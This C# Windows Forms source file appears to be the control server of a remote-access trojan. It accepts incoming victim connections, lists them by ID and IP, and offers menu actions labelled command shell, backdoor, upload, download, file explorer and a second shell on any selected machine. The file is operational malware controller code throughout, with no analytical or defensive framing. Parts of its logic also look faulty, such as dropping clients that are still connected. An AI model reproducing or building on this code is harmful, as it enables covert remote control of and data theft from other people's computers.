using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Runtime.InteropServices;

struct Client
{
    public string id;
    public string ip;
    public Socket socket;
    public string othre_info;
    public int stat;
    public int timeout;
};

namespace ctrl_server
{
    public partial class Form1 : Form
    {
        private Socket sevSocket;
        private Socket resSocket;
        private int maxConnect;
        private List<Client> listClients;
        private AsyncCallback callbackOnaccept_server;

        public static Socket resClientSocket;
        public static ManualResetEvent allDone = new ManualResetEvent(false); 

        private delegate void RefreshDelegate();
        
        public Form1()
        {
            InitializeComponent();
            listClients = new List<Client>();
        }
        
        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            maxConnect = Int16.Parse(txtMaxConnection.Text);
            dataGridView1.AutoGenerateColumns = false;
            contextMenuStrip1.Enabled = false;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            contextMenuStrip1.Enabled = true;
            listClients.Clear();
            dataGridView1.Rows.Clear();
            IPAddress ipAddr = IPAddress.Any;
            IPEndPoint sevEndPoind = new IPEndPoint(ipAddr, short.Parse(txtServerPort.Text));
            sevSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            sevSocket.Bind(sevEndPoind);
            sevSocket.Listen(int.Parse(txtMaxConnection.Text));
            callbackOnaccept_server = new AsyncCallback(this.OnAaccept_server);
            sevSocket.BeginAccept(callbackOnaccept_server, this.sevSocket);

            //启动反馈端口
            allDone.Reset();
            IPEndPoint resEndPoind;

            resEndPoind = new IPEndPoint(ipAddr, short.Parse(txtResPort.Text));
            try
            {
                resSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                resSocket.Bind(resEndPoind);
                resSocket.Listen(10);
                resSocket.BeginAccept(new AsyncCallback(onAccept_Res), resSocket);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);         
            }

            btnStart.Enabled = false;
            btnStop.Enabled = true;
        }

        public void onAccept_Res(IAsyncResult ar)
        {
            Socket server1 = (Socket)ar.AsyncState;
            try
            {
                resClientSocket = server1.EndAccept(ar);
                server1.BeginAccept(new AsyncCallback(onAccept_Res), server1);
                allDone.Set();

            }
            catch (Exception ex)
            {
               
            }
        }

        private void OnAaccept_server(IAsyncResult ar)
        {
            int t;
            Byte[] buf;
            IPEndPoint endpoint;
            Socket server1 = (Socket)ar.AsyncState;
            Socket client_socket;
            
            try
            {
                client_socket = server1.EndAccept(ar);
                server1.BeginAccept(new AsyncCallback(OnAaccept_server), server1);
                Client tmp_client = new Client();
                
                tmp_client.socket = client_socket;
                endpoint = (IPEndPoint)client_socket.RemoteEndPoint;
                //MessageBox.Show(endpoint.Address.ToString());
                tmp_client.ip = endpoint.Address.ToString();

                if (listClients.Count == 0)
                {   
                     t = 1;
                     tmp_client.id = t.ToString();                
                }
                else
                {
                    t = listClients.Count;
                    t = int.Parse(listClients[t - 1].id) + 1;
                    tmp_client.id = t.ToString();
                }
            
                buf = Encoding.ASCII.GetBytes(tmp_client.id);
                client_socket.Send(buf, buf.Length, SocketFlags.None); //发送ID
                StateObject state = new StateObject();
                state.workSocket = client_socket;
                client_socket.BeginReceive(state.buffer, 0,state.buffer.Length, 
                    0, new AsyncCallback(recv_client), state);
                tmp_client.timeout = 30;
                tmp_client.stat = 1;
                tmp_client.othre_info = "NULL";

                lock (listClients) { 
                    listClients.Add(tmp_client);
                }

                dataGridView1.BeginInvoke(new RefreshDelegate(refresh_gview), null);
            }
            catch (Exception ex)
            { 
            
            }                      
        }

        private void recv_client(IAsyncResult ar)
        { 
            String content = String.Empty;
            // Retrieve the state object and the handler socket
            // from the asynchronous state object.
            StateObject state = (StateObject)ar.AsyncState;
            Socket handler = state.workSocket;
            // Read data from the client socket.
            try
            {
                int bytesRead = handler.EndReceive(ar);

                if (bytesRead > 0)
                {
                    // There    might be more data, so store the data received so far.
                    state.sb.Append(Encoding.ASCII.GetString(
                    state.buffer, 0, bytesRead));
                    // Check for end-of-file tag. If it is not there, read
                    // more data.
                    content = state.sb.ToString();
                    // MessageBox.Show(content);
                    StateObject state2 = new StateObject();
                    state.workSocket = handler;
                    // handler.BeginReceive(state.buffer, 0, state.buffer.Length,
                    //   0, new AsyncCallback(recv_client), state);
                }
                else
                {

                    int index = findClinetBySocket(handler, ref listClients);
                    if (index < 0)
                    {
                        return;
                    }
                    else
                    {
                        handler.Close();
                        listClients.RemoveAt(index);
                        dataGridView1.BeginInvoke(new RefreshDelegate(refresh_gview), null);
                    }
                }
            }
            catch
            { 
            
            }
           
        }

        private int findClinetBySocket(Socket socket, ref List<Client> clients)
        {
            for (int i = 0; i < clients.Count; ++i)
            {
                if (clients[i].socket.Equals(socket))
                {
                    return i;
                }
            }
                return -1;
        }

        private void refresh_gview()
        {
            if (dataGridView1.InvokeRequired)
            {
                dataGridView1.BeginInvoke(new RefreshDelegate(refresh_gview), null);
                return;
            }

            dataGridView1.Rows.Clear();
            for (int i = 0; i < listClients.Count; ++i)
            {
                dataGridView1.Rows.Add((i + 1).ToString(), listClients[i].id, 
                    listClients[i].ip, listClients[i].othre_info);
            }
            return;
        }
        private void threadServer()
        { 
        
        }
       
        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {
            
        }

        private void dataGridView1_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
        {
         
        }

        private void dataGridView1_CellMouseDown(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                if (e.RowIndex >= 0)
                {
                    //若行已是选中状态就不再进行设置
                    if (dataGridView1.Rows[e.RowIndex].Selected == false)
                    {
                        dataGridView1.ClearSelection();
                        dataGridView1.Rows[e.RowIndex].Selected = true;
                    }
                    //只选中一行时设置活动单元格
                    if (dataGridView1.SelectedRows.Count == 1)
                    {
                        dataGridView1.CurrentCell = dataGridView1.Rows[e.RowIndex].Cells[e.ColumnIndex];
                    }
                    //弹出操作菜单
                    contextMenuStrip1.Show(MousePosition.X, MousePosition.Y);
                }
            }
        }

        private void Offline_ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                int index = int.Parse(dataGridView1.SelectedCells[0].Value.ToString());
                --index;
                try
                {
                    Socket socket = listClients[index].socket;
                    byte[] buf = ASCIIEncoding.ASCII.GetBytes("OFFLINE\n");
                    socket.Send(buf, buf.Length, SocketFlags.None);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Send Failure!\r\n" + ex.Message.ToString());
                    return;
                }
                MessageBox.Show("Send Success!");
            }
        }

        private void cmdshellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                int index = int.Parse(dataGridView1.SelectedCells[0].Value.ToString());
                --index;
                CMDShell cmdForm = new CMDShell();
                cmdForm.client_socket = listClients[index].socket;
                cmdForm.Owner = this;
                cmdForm.Show();                
            }
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            sevSocket.Close();
            resSocket.Close();
            for (int i = 0; i < listClients.Count; ++i)
            {
                listClients[i].socket.Close();
            }
            listClients.Clear();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            contextMenuStrip1.Enabled = false;
        }

        private void backdoorToolStripMenujItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                int index = int.Parse(dataGridView1.SelectedCells[0].Value.ToString());
                --index;
                Backdoor bdoorForm = new Backdoor();
                bdoorForm.client_socket = listClients[index].socket;
                bdoorForm.Show();
            }
           
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                int index = int.Parse(dataGridView1.SelectedCells[0].Value.ToString());
                --index;

                Upload uploadform = new Upload();
                uploadform.client_socket = listClients[index].socket;
                uploadform.Show();
            }
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                int index = int.Parse(dataGridView1.SelectedCells[0].Value.ToString());
                --index;
                DownloadForm downloadForm = new DownloadForm();
                downloadForm.client_socket = listClients[index].socket;
                downloadForm.Show();
                
            }
           
        }

        private void explorerToolStripMenuItem_Click(object sender, EventArgs e)
        {      
             if (dataGridView1.SelectedRows.Count == 1)
            {
                int index = int.Parse(dataGridView1.SelectedCells[0].Value.ToString());
                --index;
                ExplorerForm exploreForm = new ExplorerForm();
                exploreForm.client_socket = listClients[index].socket;
                exploreForm.Show();

            }
           
        }

        private void shell2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count == 1)
            {
                int index = int.Parse(dataGridView1.SelectedCells[0].Value.ToString());
                --index;
                Shell2 shellForm = new Shell2();
                shellForm.clientSocket = listClients[index].socket;
                shellForm.Show();

            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
          
            for (int i = 0; i < listClients.Count; ++i)
            {
                if (Common.IsSocketConnected(listClients[i].socket) == true)
                {
                    int index = findClinetBySocket(listClients[i].socket, ref listClients);
                    if (index < 0)
                    {
                        return;
                    }
                    else
                    {
                        listClients[i].socket.Close();
                        listClients.RemoveAt(index);
                        dataGridView1.BeginInvoke(new RefreshDelegate(refresh_gview), null);
                        i--;
                    }
                }
            }
        }

     

      }
}
